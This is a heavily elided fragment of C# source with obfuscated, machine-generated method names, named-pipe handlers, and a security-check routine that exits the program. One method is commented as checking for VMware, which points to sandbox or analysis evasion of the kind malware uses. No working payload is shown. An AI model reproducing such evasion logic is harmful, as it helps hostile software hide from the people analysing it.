...
namespace System
{
    class Program
    {
        ...
        SystemMonitor.InitializeSecurityChecks();
            ...
            {
                SystemManager.TerminateApplication(0);
                return;
            }
        ...
        private static bool RobustHandler3F6F()
        {
            try
            {
                // Check for VMware
        ...
        private static bool AdaptiveTracker323C()
        {
            try
            {
        ...
        private static bool StrategicAdapterBEE6()
        {
            try
            {
        ...
        private static bool IntelligentRouterB850()
        {
            try
            {
        ...
        private static void IntelligentAdapterAD76(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
            _complete.Set();
        }

        private static void RobustProvider017A(object sender, NamedPipeMessageArgs e)
        {
